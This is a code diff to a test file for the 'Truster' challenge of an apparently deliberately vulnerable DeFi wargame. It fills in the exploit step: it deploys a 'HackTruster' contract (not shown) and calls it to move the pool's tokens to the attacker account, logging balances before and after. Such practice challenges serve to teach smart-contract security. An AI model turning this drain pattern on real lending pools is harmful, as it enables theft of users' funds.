@@ -28,7 +28,21 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
+        
+        console.log(`Pool DVT Balance: ${await this.token.balanceOf(this.pool.address)}`);
+        console.log(`Attacker DVT Balance: ${await this.token.balanceOf(attacker.address)}`);
+
+        // Deploy the Hack contract
+        const HackTruster = await ethers.getContractFactory('HackTruster');
+        
+        let hack = await HackTruster.deploy(this.token.address, this.pool.address);
+        
+        // Hack
+        await hack.hack(attacker.address);
+        
+        console.log(`Pool DVT Balance: ${await this.token.balanceOf(this.pool.address)}`);
+        console.log(`Attacker DVT Balance: ${await this.token.balanceOf(attacker.address)}`);
+
     });
 
     after(async function () {
